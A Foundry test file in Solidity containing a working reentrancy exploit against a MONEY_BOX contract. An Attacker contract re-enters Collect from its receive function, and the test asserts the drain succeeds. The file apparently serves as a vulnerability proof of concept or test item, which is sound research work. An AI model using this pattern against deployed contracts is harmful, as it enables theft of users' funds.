
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {

    MONEY_BOX public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MONEY_BOX();
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.SetLogFile(address(new Log()));
        _contractUnderTest.Initialized();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= 10 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        vm.warp(block.timestamp + 1 days);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackValue;

    constructor(address victimAddress) {
        victim = MONEY_BOX(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackValue = val;
        victim.Put{value: val}(1 days);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(victim).balance;
        victim.Collect(val);
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.Collect(attackValue);
            if (attackCallCount == 2) {
                exploitSucceeded = true;
            }
        }
    }
}
